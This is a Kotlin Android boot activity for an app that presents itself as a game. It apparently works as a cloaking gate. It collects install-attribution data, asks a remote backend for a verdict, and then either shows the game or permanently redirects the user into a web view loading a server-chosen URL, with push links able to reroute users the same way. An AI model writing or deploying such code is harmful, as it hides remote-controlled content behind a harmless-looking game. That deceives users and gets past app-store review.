package com.voidloom.keel

import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.lifecycle.lifecycleScope
import com.gravitysiege.gravitysiegegame.BuildConfig
import com.gravitysiege.gravitysiegegame.MainActivity
import com.voidloom.keel.core.KeelImmersion
import com.voidloom.keel.core.KeelMark
import com.voidloom.keel.core.KeelTrail
import com.voidloom.keel.core.KeelVerdict
import com.voidloom.keel.face.KeelBootView
import com.voidloom.keel.lock.KeelHref
import com.voidloom.keel.wire.KeelBolt
import com.voidloom.keel.wire.KeelPass
import com.voidloom.keel.wire.KeelPing
import com.voidloom.keel.wire.KeelRig
import com.voidloom.keel.wire.KeelSpan
import com.voidloom.keel.wire.KeelVault
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeoutOrNull

class KeelBootActivity : ComponentActivity() {

    private lateinit var vault: KeelVault
    private lateinit var span: KeelSpan
    private lateinit var gate: KeelBolt
    private lateinit var loadView: KeelBootView

    private val tracker: KeelRig
        get() = (application as KeelApp).tracker

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        KeelImmersion.apply(this)

        vault = KeelVault(this)
        span = KeelSpan(this)
        gate = KeelBolt()
        KeelPing.ensureChannel(this)

        val trail = vault.readTrail()
        val pushUrl = KeelPing.extractUrl(intent)

        if (pushUrl != null && trail == KeelTrail.Web && KeelPass.offer(pushUrl)) {
            info("warm push handed to live shell")
            finish()
            return
        }

        if (trail == KeelTrail.Pending && pushUrl == null && !span.hasAnyAdapter()) {
            info("first run offline, still screen first frame")
            startActivity(Intent(this, KeelDryActivity::class.java))
            finish()
            return
        }

        if (pushUrl != null && trail != KeelTrail.Native) vault.stashPushLink(pushUrl)

        loadView = KeelBootView(this)
        setContentView(loadView)
        lifecycleScope.launch { route(trail) }
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        setIntent(intent)
        val pushUrl = KeelPing.extractUrl(intent) ?: return
        when (vault.readTrail()) {
            KeelTrail.Native -> info("push tap while native, game stays")
            KeelTrail.Web -> {
                if (KeelPass.offer(pushUrl)) finish()
                else openShell(pushUrl)
            }
            KeelTrail.Pending -> vault.stashPushLink(pushUrl)
        }
    }

    private suspend fun route(trail: KeelTrail) {
        if (trail == KeelTrail.Native) {
            openGame()
            return
        }
        loadView.progress = 0.16f
        if (!awaitConnection(trail)) return
        when (trail) {
            KeelTrail.Web -> resolveReturning()
            else -> resolveFirstLaunch()
        }
    }

    private suspend fun awaitConnection(trail: KeelTrail): Boolean {
        if (span.hasAnyAdapter()) return true
        val arrived = withTimeoutOrNull(KeelMark.CONNECT_GRACE_MS) {
            span.statusStream().first { it == KeelSpan.Status.Online }
        } != null
        if (arrived) return true
        val resume = if (trail == KeelTrail.Web && vault.hasUsableLink()) {
            vault.readCachedLink()
        } else {
            null
        }
        startActivity(
            Intent(this, KeelDryActivity::class.java).apply {
                if (!resume.isNullOrEmpty()) putExtra(KeelDryActivity.EXTRA_RESUME_URL, resume)
            },
        )
        finish()
        return false
    }

    private suspend fun resolveFirstLaunch() {
        tracker.ignite(this)
        tracker.retrace(this)
        loadView.progress = 0.42f
        val reply = askBackend(firstLaunch = true)
        loadView.progress = 0.96f
        if (reply.allowed && reply.hasLink) {
            commitWeb(reply)
            loadView.progress = 1f
            openShell(reply.link)
            return
        }
        when {
            !reply.answered -> info("endpoint unreachable, game for now, trail left open")
            !tracker.hasAttributionData() -> info("empty attribution, game for now, trail left open")
            else -> {
                vault.writeTrail(KeelTrail.Native)
                info("backend ruled native (${reply.note})")
            }
        }
        loadView.progress = 1f
        openGame()
    }

    private suspend fun resolveReturning() {
        val pushed = KeelHref.pick(vault.takePushLink())
        if (pushed != null) {
            openShell(pushed)
            return
        }
        tracker.ignite(this)
        tracker.retrace(this)
        loadView.progress = 0.52f
        val reply = askBackend(firstLaunch = false)
        loadView.progress = 0.96f
        val cached = vault.readCachedLink()
        when {
            reply.allowed && reply.hasLink -> {
                commitWeb(reply)
                loadView.progress = 1f
                openShell(reply.link)
            }
            !cached.isNullOrEmpty() -> {
                loadView.progress = 1f
                openShell(cached)
            }
            else -> {
                startActivity(Intent(this, KeelDryActivity::class.java))
                finish()
            }
        }
    }

    private suspend fun askBackend(firstLaunch: Boolean): KeelVerdict {
        val body = withContext(Dispatchers.IO) {
            tracker.collectBody(firstLaunch).also { gate.decorate(it, this@KeelBootActivity, tracker) }
        }
        loadView.progress = if (firstLaunch) 0.72f else 0.78f
        return gate.query(body)
    }

    private fun commitWeb(reply: KeelVerdict) {
        vault.writeTrail(KeelTrail.Web)
        reply.link?.let(vault::writeCachedLink)
        vault.writeLinkTtl(reply.ttl ?: 0L)
    }

    private fun openShell(url: String?) {
        val target = KeelHref.pick(url)
        if (target == null) {
            openGame()
            return
        }
        if (vault.shouldOfferInvite(this)) {
            startActivity(
                Intent(this, KeelHailActivity::class.java)
                    .putExtra(KeelHailActivity.EXTRA_TARGET_URL, target)
                    .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP),
            )
        } else {
            startActivity(
                Intent(this, KeelPaneActivity::class.java)
                    .putExtra(KeelPaneActivity.EXTRA_TARGET_URL, target)
                    .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP),
            )
        }
        overridePendingTransition(0, 0)
        finish()
    }

    private fun openGame() {
        startActivity(
            Intent(this, MainActivity::class.java)
                .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK or Intent.FLAG_ACTIVITY_NEW_TASK),
        )
        finish()
    }

    override fun onResume() {
        super.onResume()
        KeelImmersion.apply(this)
    }

    override fun onWindowFocusChanged(hasFocus: Boolean) {
        super.onWindowFocusChanged(hasFocus)
        if (hasFocus) KeelImmersion.apply(this)
    }

    private fun info(message: String) {
        if (BuildConfig.DEBUG) Log.i(TAG, message)
    }

    private companion object {
        const val TAG = "KeelBoot"
    }
}
